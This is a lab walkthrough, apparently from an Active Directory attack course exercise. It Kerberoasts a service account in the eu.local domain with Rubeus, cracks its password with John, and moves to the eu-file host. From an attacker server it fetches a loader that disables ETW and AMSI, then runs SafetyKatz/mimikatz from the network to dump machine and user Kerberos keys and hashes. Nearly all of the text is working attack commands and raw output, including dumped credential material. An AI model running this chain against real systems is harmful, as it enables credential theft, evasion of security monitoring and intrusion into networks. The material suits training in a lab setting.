# Hands-ON 22:
```
Find a service account in the eu.local forest and Kerberoast its password.
```

## Index Of Content:
  1. [Find service accounts](#find-service-accounts)  

## Find service accounts


```
 Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName -Server $_.Name}


DistinguishedName    : CN=krbtgt,CN=Users,DC=eu,DC=local
Enabled              : False
GivenName            :
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : a36265f2-2db1-4555-acc2-e9736fc1b6f6
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-502
Surname              :
UserPrincipalName    :

DistinguishedName    : CN=storagesvc,CN=Users,DC=eu,DC=local
Enabled              : True
GivenName            : storage
Name                 : storagesvc
ObjectClass          : user
ObjectGUID           : 041fedb0-a442-4cdf-af34-6559480a2d74
SamAccountName       : storagesvc
ServicePrincipalName : {MSSQLSvc/eu-file.eu.local}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-1106
Surname              : svc
UserPrincipalName    : storagesvc

```

Request hashes using rubeus from eu.local of kerberoast users:

```
C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : storagesvc
[*] Target Domain          : eu.local
[*] Searching path 'LDAP://EU-DC.eu.local/DC=eu,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=storagesvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\euhashes.txt

[*] Roasted hashes written to : C:\AD\Tools\euhashes.txt

```
Perform a locla bruteforce attack:
```
C:\Users\studentuser17>C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty@123       (?)
1g 0:00:00:00 DONE (2023-03-01 11:43) 76.92g/s 59076p/s 59076c/s 59076C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


Enumerate group membership for the new user storagesvc on the external domain eu.local:

```
PS C:\Users\studentuser17> function Get-ADPrincipalGroupMembershiprecursive ($SamAccountNname) {
>> $groups=@(Get-ADPrincipalGroupMembership -Server eu.local -Identity $SamAccountNname | select -ExpandProperty distinguishedname)
>> $groups
>> if($groups.count -gt 0)
>> {
>> foreach ($group in $groups)
>> {
>> Get-ADPrincipalGroupMembershiprecursive $group
>> }
>> }
>> }

PS C:\Users\studentuser17> Get-ADPrincipalGroupMembershiprecursive  storagesvc
CN=Domain Users,CN=Users,DC=eu,DC=local
CN=eufileadmins,CN=Users,DC=eu,DC=local
CN=Users,CN=Builtin,DC=eu,DC=local
```

Review group eufileadmins :

```
PS C:\Users\studentuser17> Get-ADGroup -Identity eufileadmins -Server eu.local -Properties *


CanonicalName                   : eu.local/Users/eufileadmins
CN                              : eufileadmins
Created                         : 7/18/2019 10:26:55 PM
createTimeStamp                 : 7/18/2019 10:26:55 PM
Deleted                         :
Description                     : eufileadmins
DisplayName                     : eufileadmins
DistinguishedName               : CN=eufileadmins,CN=Users,DC=eu,DC=local
dSCorePropagationData           : {12/31/1600 4:00:00 PM}
GroupCategory                   : Security
GroupScope                      : Global
groupType                       : -2147483646
HomePage                        :
instanceType                    : 4
isDeleted                       :
LastKnownParent                 :
ManagedBy                       :
member                          : {CN=storagesvc,CN=Users,DC=eu,DC=local}
MemberOf                        : {}
Members                         : {CN=storagesvc,CN=Users,DC=eu,DC=local}
Modified                        : 7/18/2019 10:27:14 PM
modifyTimeStamp                 : 7/18/2019 10:27:14 PM
Name                            : eufileadmins
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : CN=Group,CN=Schema,CN=Configuration,DC=eu,DC=local
ObjectClass                     : group
ObjectGUID                      : 59d88009-6725-4ce6-bf06-d59a5258bf76
objectSid                       : S-1-5-21-3657428294-2017276338-1274645009-1108
ProtectedFromAccidentalDeletion : False
SamAccountName                  : eufileadmins
sAMAccountType                  : 268435456
sDRightsEffective               : 0
SID                             : S-1-5-21-3657428294-2017276338-1274645009-1108
SIDHistory                      : {}
uSNChanged                      : 23321
uSNCreated                      : 23316
whenChanged                     : 7/18/2019 10:27:14 PM
whenCreated                     : 7/18/2019 10:26:55 PM
```
Launch new cmd process with the storagesvc user credentials:

```
PS C:\Users\studentuser17> runas.exe /user:eu.local\storagesvc /netonly cmd
Enter the password for eu.local\storagesvc:
Attempting to start cmd as user "eu.local\storagesvc" ...
```

Access to the  new domain at machine eu-file:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
us\studentuser17

C:\Windows\system32>klist

Current LogonId is 0:0x21bdce

Cached Tickets: (0)

C:\Windows\system32>C:\AD\Tools\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x21bdce

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


C:\Windows\system32>winrs -r:eu-file.eu.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\storagesvc>whoami
whoami
eu\storagesvc

C:\Users\storagesvc>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```


Copy Loader.exe binary to the current machine and use network to execute binary SafetyKatz.exe in order to dump lsa  credentials of the eu-file :
```
wget http://192.168.100.17:8989/Loader.exe -o Loader.exe
PS C:\Users\storagesvc> ls
ls


    Directory: C:\Users\storagesvc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       12/11/2022   7:11 AM                3D Objects
d-r---       12/11/2022   7:11 AM                Contacts
d-r---       12/11/2022   7:11 AM                Desktop
d-r---       12/11/2022   7:11 AM                Documents
d-r---       12/11/2022   7:11 AM                Downloads
d-r---       12/11/2022   7:11 AM                Favorites
d-r---       12/11/2022   7:11 AM                Links
d-r---       12/11/2022   7:11 AM                Music
d-r---       12/11/2022   7:11 AM                Pictures
d-r---       12/11/2022   7:11 AM                Saved Games
d-r---       12/11/2022   7:11 AM                Searches
d-r---       12/11/2022   7:11 AM                Videos
-a----        3/23/2023   1:24 PM          64512 Loader.exe

```
on the student machine side launch a python server to share the files:
```
PS C:\AD\Tools> python -m SimpleHTTPServer 8989
Serving HTTP on 0.0.0.0 port 8989 ...
192.168.12.7 - - [23/Mar/2023 13:24:34] "GET /Loader.exe HTTP/1.1" 200 -
192.168.12.7 - - [23/Mar/2023 13:25:53] "GET /SafetyKatz.exe HTTP/1.1" 200 -
```

```
C:\Users\storagesvc>C:\Users\storagesvc\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
C:\Users\storagesvc\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://192.168.100.17:8989/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://192.168.100.17:8989/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://192.168.100.17:8989/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::keys

Authentication Id : 0 ; 1747270 (00000000:001aa946)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 4:07:59 AM
SID               : S-1-5-90-0-2

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 14 85 35 de 36 a1 3b 10 a6 37 dc 07 4c 4b 4f 12 e6 71 e9 7e e9 79 e4 16 36 a6 04 57 68 aa 3f 78 41 7c a9 fa 5c c6 85 02 db e6 d0 8d 7f 5c 29 85 ed be d1 d3 62 5e 42 f8 3d 15 10 2b aa 9a f2 c5 48 2c 49 4b b0 a9 b3 3c 72 51 e5 83 00 f5 c9 fa 95 13 32 1e 16 50 3d be d3 27 1e 2d d3 2c 46 01 4d 46 ec 32 59 6f cf 64 68 02 d0 4e 92 b3 41 a1 f8 76 a2 1d c8 7e 77 b0 ba d9 83 0e 2f 59 67 61 7a 95 a1 4a 64 c3 9e 96 94 b6 a4 c6 a5 bf de 7b 76 cf 1e 42 bf 28 54 ae 33 b9 cb 0f 7b c6 d6 02 d2 1c 6d 2a a5 35 c6 37 79 ed b9 7d 29 b8 c1 ea 8f 18 9d 10 1c 5a 07 c3 74 db 60 76 bc 9d d7 a8 03 de 31 e6 e6 0b 47 7d 24 3e 84 60 12 6e 4a 68 aa d9 72 5a 24 4f 5a b6 df 1e de c9 19 78 c3 90 10 db 2d 34 15 74 7b 94 70 9f f4 80 5b 03 d8 b0
         * Key List :
           aes256_hmac       75b0e088ad7405f05001a9e56091b5844b986719efb27d5e095f1501a26b1b4b
           aes128_hmac       39b657003e515de8ac4193883c1e5b28
           rc4_hmac_nt       419757d1b609d9f8e211092272631abd
           rc4_hmac_old      419757d1b609d9f8e211092272631abd
           rc4_md4           419757d1b609d9f8e211092272631abd
           rc4_hmac_nt_exp   419757d1b609d9f8e211092272631abd
           rc4_hmac_old_exp  419757d1b609d9f8e211092272631abd

Authentication Id : 0 ; 1747163 (00000000:001aa8db)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 4:07:59 AM
SID               : S-1-5-90-0-2

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
         * Key List :
           aes256_hmac       80ed32814b26d81e647f0a1d889c5c0ecdaec1a1153beb5d9f0720d7f1c761ad
           aes128_hmac       8cab0a354742d43b41846b5c04232392
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 1742331 (00000000:001a95fb)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 4:07:59 AM
SID               : S-1-5-96-0-2

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
         * Key List :
           aes256_hmac       80ed32814b26d81e647f0a1d889c5c0ecdaec1a1153beb5d9f0720d7f1c761ad
           aes128_hmac       8cab0a354742d43b41846b5c04232392
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 29244 (00000000:0000723c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               : S-1-5-96-0-1

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
         * Key List :
           aes256_hmac       80ed32814b26d81e647f0a1d889c5c0ecdaec1a1153beb5d9f0720d7f1c761ad
           aes128_hmac       8cab0a354742d43b41846b5c04232392
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : EU-FILE$
Domain            : EU
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               : S-1-5-18

         * Username : eu-file$
         * Domain   : EU.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       60f97b489e9100efb069880c9f0e566a7d57b34d8cb5a9bc1c0afc3ee635f941
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 49179 (00000000:0000c01b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-90-0-1

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 14 85 35 de 36 a1 3b 10 a6 37 dc 07 4c 4b 4f 12 e6 71 e9 7e e9 79 e4 16 36 a6 04 57 68 aa 3f 78 41 7c a9 fa 5c c6 85 02 db e6 d0 8d 7f 5c 29 85 ed be d1 d3 62 5e 42 f8 3d 15 10 2b aa 9a f2 c5 48 2c 49 4b b0 a9 b3 3c 72 51 e5 83 00 f5 c9 fa 95 13 32 1e 16 50 3d be d3 27 1e 2d d3 2c 46 01 4d 46 ec 32 59 6f cf 64 68 02 d0 4e 92 b3 41 a1 f8 76 a2 1d c8 7e 77 b0 ba d9 83 0e 2f 59 67 61 7a 95 a1 4a 64 c3 9e 96 94 b6 a4 c6 a5 bf de 7b 76 cf 1e 42 bf 28 54 ae 33 b9 cb 0f 7b c6 d6 02 d2 1c 6d 2a a5 35 c6 37 79 ed b9 7d 29 b8 c1 ea 8f 18 9d 10 1c 5a 07 c3 74 db 60 76 bc 9d d7 a8 03 de 31 e6 e6 0b 47 7d 24 3e 84 60 12 6e 4a 68 aa d9 72 5a 24 4f 5a b6 df 1e de c9 19 78 c3 90 10 db 2d 34 15 74 7b 94 70 9f f4 80 5b 03 d8 b0
         * Key List :
           aes256_hmac       75b0e088ad7405f05001a9e56091b5844b986719efb27d5e095f1501a26b1b4b
           aes128_hmac       39b657003e515de8ac4193883c1e5b28
           rc4_hmac_nt       419757d1b609d9f8e211092272631abd
           rc4_hmac_old      419757d1b609d9f8e211092272631abd
           rc4_md4           419757d1b609d9f8e211092272631abd
           rc4_hmac_nt_exp   419757d1b609d9f8e211092272631abd
           rc4_hmac_old_exp  419757d1b609d9f8e211092272631abd

Authentication Id : 0 ; 49136 (00000000:0000bff0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-90-0-1

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
         * Key List :
           aes256_hmac       80ed32814b26d81e647f0a1d889c5c0ecdaec1a1153beb5d9f0720d7f1c761ad
           aes128_hmac       8cab0a354742d43b41846b5c04232392
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : EU-FILE$
Domain            : EU
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:35 AM
SID               : S-1-5-20

         * Username : eu-file$
         * Domain   : EU.LOCAL
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
         * Key List :
           aes256_hmac       60f97b489e9100efb069880c9f0e566a7d57b34d8cb5a9bc1c0afc3ee635f941
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 29265 (00000000:00007251)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:38:34 AM
SID               : S-1-5-96-0-0

         * Username : EU-FILE$
         * Domain   : eu.local
         * Password : 28 ba b6 6e 80 64 e5 e7 fb 36 26 3b c2 95 d8 3b 9e 58 fc 34 9c 25 ca de 10 ed 27 25 76 0a dc bf 5b 69 e3 54 96 95 ad c3 70 a6 28 b2 8a 9b 99 8a 59 e6 db 48 c3 bd ad 5a ca 93 74 0f 66 fb de 4d 97 2e 88 f6 5d 2e 52 83 84 6d 19 db cc df 67 0b 1e 48 94 2a e2 98 86 3c 09 49 09 54 7c d7 11 df cd 81 aa 4e 76 03 11 41 cb cc 24 d6 b1 98 8a f0 7a 56 26 a4 c5 71 a2 17 0b 52 39 e8 6f 20 5e 10 69 40 85 9c 55 9e c7 3e 55 f7 17 b7 73 e2 af 81 e2 79 e7 15 72 f1 f3 76 8c ea 62 e6 a5 d9 98 50 f3 15 67 39 d6 d1 b1 71 91 e5 da a7 5f 4c 16 0b 5b a0 a3 dd 21 38 dc d6 1b de 44 68 d1 fc 0e e4 57 0c e6 11 63 10 33 a3 e0 4c 8d be 66 ba 4c fc f3 7e 86 90 41 9c 36 3f 60 14 fb 62 94 07 1e 8f 86 97 3e 0b b6 6c 51 2c bf 0d 74 dd 27 aa 28 87
         * Key List :
           aes256_hmac       80ed32814b26d81e647f0a1d889c5c0ecdaec1a1153beb5d9f0720d7f1c761ad
           aes128_hmac       8cab0a354742d43b41846b5c04232392
           rc4_hmac_nt       cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old      cb13975657590b7c342506e8e9d6ef39
           rc4_md4           cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_nt_exp   cb13975657590b7c342506e8e9d6ef39
           rc4_hmac_old_exp  cb13975657590b7c342506e8e9d6ef39

Authentication Id : 0 ; 1876451 (00000000:001ca1e3)
Session           : RemoteInteractive from 2
User Name         : storagesvc
Domain            : EU
Logon Server      : EU-DC
Logon Time        : 12/26/2022 4:17:30 AM
SID               : S-1-5-21-3657428294-2017276338-1274645009-1106

         * Username : storagesvc
         * Domain   : EU.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       4a0d89d845868ae3dcab270fe23bedd442a62c4cad7034e4c60beda3c0f65e04
           rc4_hmac_nt       5c76877a9c454cded58807c20c20aeac
           rc4_hmac_old      5c76877a9c454cded58807c20c20aeac
           rc4_md4           5c76877a9c454cded58807c20c20aeac
           rc4_hmac_nt_exp   5c76877a9c454cded58807c20c20aeac
           rc4_hmac_old_exp  5c76877a9c454cded58807c20c20aeac

Authentication Id : 0 ; 1876056 (00000000:001ca058)
Session           : RemoteInteractive from 2
User Name         : storagesvc
Domain            : EU
Logon Server      : EU-DC
Logon Time        : 12/26/2022 4:17:30 AM
SID               : S-1-5-21-3657428294-2017276338-1274645009-1106

         * Username : storagesvc
         * Domain   : EU.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       4a0d89d845868ae3dcab270fe23bedd442a62c4cad7034e4c60beda3c0f65e04
           rc4_hmac_nt       5c76877a9c454cded58807c20c20aeac
           rc4_hmac_old      5c76877a9c454cded58807c20c20aeac
           rc4_md4           5c76877a9c454cded58807c20c20aeac
           rc4_hmac_nt_exp   5c76877a9c454cded58807c20c20aeac
           rc4_hmac_old_exp  5c76877a9c454cded58807c20c20aeac

mimikatz #

```
logonPasswords:

```
mimikatz # sekurlsa::
ERROR mimikatz_doLocal ; "(null)" command of "sekurlsa" module not found !

Module :        sekurlsa
Full name :     SekurLSA module
Description :   Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
              lp  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
